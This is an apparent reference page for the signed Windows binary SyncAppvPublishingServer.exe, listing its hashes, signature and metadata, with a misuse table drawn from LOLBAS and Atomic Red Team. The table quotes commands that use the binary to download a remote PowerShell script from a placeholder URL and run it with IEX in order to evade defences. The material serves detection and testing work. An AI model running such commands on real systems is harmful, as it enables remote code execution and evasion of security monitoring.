---
title: SyncAppvPublishingServer.exe | Microsoft Application Virtualization Sync Utility
---

# SyncAppvPublishingServer.exe 

* File Path: `C:\WINDOWS\system32\SyncAppvPublishingServer.exe`
* Description: Microsoft Application Virtualization Sync Utility
* Comments: 

## Hashes

Type | Hash
-- | --
MD5 | `F5436BA0DDCB88473858BDB310C234D9`
SHA1 | `D0EB5B93AB2B2E657BCA60124E030156E8C318AA`
SHA256 | `19AE8DB900F2F3446C51A05651FF61B071B091D75566AB3DDEBEFEB1F995705F`
SHA384 | `7FD2024FF192AF9C64F56FD8322D6F090CCBF2140FD34123156E36BF33C758DEEE76EDDC63666BA3D8E0C035C078B8B3`
SHA512 | `19499C76127F0457CB7B1CB0BA04C32FD803764F9C0732A087DAF6C6A9124E5A9525C9FA662B31542381ADDBC374FDCD1A4B619F2CD813EB50C7D23AF720094E`
SSDEEP | `768:nKrnaluTrkL5oZjn6V46K4Dwikn9aeDx/RP+Ed2I1PrkLHb:nvuTr5Zjna4pmwiE9aeDxpPX/PrkL7`

## Runtime Data

### Usage (stdout):
```Batchfile

```

### Usage (stderr):
```Batchfile

```

### Child Processes:


## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: syncappvpublishingserver.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.18362.815 (WinBuild.160101.0800)
* Product Version: 10.0.18362.815
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `SyncAppvPublishingServer.exe` being misused. While `SyncAppvPublishingServer.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `Name: SyncAppvPublishingServer.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `  - Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `    Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `  - Path: C:\Windows\System32\SyncAppvPublishingServer.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `  - Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | ` - IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `Name: Syncappvpublishingserver.vbs` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `  - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `  - Path: C:\Windows\System32\SyncAppvPublishingServer.vbs` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) |   - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) |   - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) |   - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) |   - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | - [Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution](#atomic-test-1---syncappvpublishingserver-signed-script-powershell-command-execution) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | ## Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | - [Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code](#atomic-test-2---syncappvpublishingserver---execute-arbitrary-powershell-code) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | ## Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | SyncAppvPublishingServer.exe "n; #{powershell_code}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


